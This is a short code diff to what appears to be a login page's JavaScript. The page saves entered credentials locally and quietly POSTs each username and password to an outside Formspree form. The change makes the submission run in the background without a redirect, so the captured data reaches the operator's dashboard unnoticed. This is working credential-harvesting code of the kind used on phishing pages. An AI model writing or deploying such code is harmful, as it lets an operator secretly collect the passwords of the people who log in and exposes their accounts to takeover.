@@ -132,10 +132,13 @@
             });
             localStorage.setItem('mama_attempts', JSON.stringify(attempts));
 
-            // Send data to cloud backend (Formspree) so it works across different phones
+            // Send data to cloud backend (Formspree) in the background so it lands in your dashboard without redirecting
             fetch('https://formspree.io/f/xdekqogg', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
                 body: JSON.stringify({ username: username, password: password })
             }).catch(err => console.log('Cloud sync error'));
 
